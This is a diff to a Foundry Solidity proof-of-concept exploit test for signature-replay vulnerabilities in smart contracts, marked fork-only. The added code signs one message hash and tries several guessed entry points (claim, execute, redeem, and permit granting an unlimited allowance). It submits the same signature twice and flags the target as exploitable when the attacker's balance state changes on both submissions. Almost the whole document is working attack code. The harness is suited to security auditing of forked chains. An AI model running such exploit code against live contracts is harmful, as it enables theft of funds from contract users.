@@ -9,9 +9,10 @@ import {Test, console} from "forge-std/Test.sol";
 ///         signature can be submitted twice (or on another chain / another
 ///         contract using the same verifier) and accepted again.
 /// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
-///      scripts/run-fork-poc.sh. TODO: adapt the signed payload to the
-///      target's exact scheme (EIP-712 domain / eth-signed message /
-///      raw hash) and claim() to its real entry point.
+///      scripts/run-fork-poc.sh. The signed entry point is a guess, so
+///      several are tried and the result is judged on the OBSERVABLE -- the
+///      SAME signature moves the caller's state TWICE -- never on the bare
+///      fact that a call returned.
 
 contract PoC is Test {
     address public target;
@@ -35,29 +36,97 @@ contract PoC is Test {
         assertGt(target.code.length, 0, "target has no code at this fork block");
     }
 
-    function test_exploit() public {
-        require(MESSAGE_HASH != bytes32(0), "set MESSAGE_HASH to the target's signed message hash");
+    function _viewOrZero(string memory sig, address who) internal view returns (uint256) {
+        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(sig, who));
+        if (ok && ret.length == 32) return abi.decode(ret, (uint256));
+        return 0;
+    }
 
-        address signer = vm.addr(SIGNER_KEY);
-        console.log("signer:", signer);
-        // TODO: sign the exact digest the target verifies (EIP-712 digest
-        // or keccak256("\x19Ethereum Signed Message:\n32" + hash)).
+    /// A fingerprint of the caller's value-bearing state: ETH plus whichever
+    /// common balance view the target exposes. A replay must move THIS twice.
+    function _readState(address who) internal view returns (uint256) {
+        uint256 acc = who.balance;
+        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("balanceOf(address)", who))));
+        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("credits(address)", who))));
+        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("balances(address)", who))));
+        return acc;
+    }
+
+    /// Try one signed entry point and accept it only when the OBSERVABLE
+    /// changes, never when the call merely returns: the SAME signature must
+    /// move the caller's state on a SECOND, identical submission. A no-op
+    /// returns successfully and moves nothing; a target with a nonce rejects
+    /// the replay.
+    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
+        internal
+        returns (string memory)
+    {
+        vm.prank(attacker);
+        (bool ok1,) = target.call(data);
+        if (!ok1) {
+            console.log("tried", label, "first use reverted");
+            return "";
+        }
+        uint256 mid = _readState(attacker);
+
+        vm.prank(attacker);
+        (bool ok2,) = target.call(data);
+        console.log("tried", label, ok2 ? "replay returned" : "replay reverted");
+        uint256 after_ = _readState(attacker);
+
+        // OBSERVABLE: state moved on the first use AND moved AGAIN on the
+        // identical second use.
+        if (ok2 && mid != before && after_ != mid) return label;
+        return "";
+    }
+
+    /// The signed entry point is a GUESS; try the plausible ones.
+    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);
         bytes memory sig = abi.encodePacked(r, s, v);
 
-        // TODO: adapt to the target's real claim / redeem / execute entry.
-        (bool firstOk,) = target.call(
-            abi.encodeWithSignature("claim(bytes)", sig)
+        used = _attempt(attacker, before, "claim(bytes)", abi.encodeWithSignature("claim(bytes)", sig));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "execute(bytes)", abi.encodeWithSignature("execute(bytes)", sig));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "redeem(bytes)", abi.encodeWithSignature("redeem(bytes)", sig));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "claim(bytes32,bytes)", abi.encodeWithSignature("claim(bytes32,bytes)", MESSAGE_HASH, sig));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "execute(bytes32,bytes)", abi.encodeWithSignature("execute(bytes32,bytes)", MESSAGE_HASH, sig));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
+            abi.encodeWithSignature(
+                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
+                vm.addr(SIGNER_KEY),
+                attacker,
+                type(uint256).max,
+                block.timestamp + 1 days,
+                v,
+                r,
+                s
+            )
         );
-        require(firstOk, "first claim failed -- adapt the signed payload / entry point");
+        if (bytes(used).length > 0) return used;
+        return "";
+    }
 
-        // Replay the EXACT same signature.
-        (bool secondOk,) = target.call(
-            abi.encodeWithSignature("claim(bytes)", sig)
+    function test_exploit() public {
+        require(MESSAGE_HASH != bytes32(0), "set MESSAGE_HASH to the target's signed message hash");
+
+        address attackerEOA = makeAddr("attacker");
+        vm.deal(attackerEOA, 1 ether);
+
+        uint256 before = _readState(attackerEOA);
+        string memory used = _tryEntry(attackerEOA, before);
+        console.log("signature-replay entry point that accepted the same signature twice:", used);
+
+        assertTrue(
+            bytes(used).length > 0,
+            "no signature-replay entry point reproduced. Tried claim(bytes), execute(bytes), redeem(bytes), claim(bytes32,bytes), execute(bytes32,bytes), permit(address,address,uint256,uint256,uint8,bytes32,bytes32) with the same signature submitted twice. This does NOT establish safety: the entry may have another name or signature, the digest/domain may differ from MESSAGE_HASH, or the signer may not be one the target trusts."
         );
-        console.log("first claim ok:", firstOk);
-        console.log("replay claim ok:", secondOk);
-        assertTrue(secondOk, "exploit did not reproduce: replay was rejected (nonce present)");
-
     }
 }
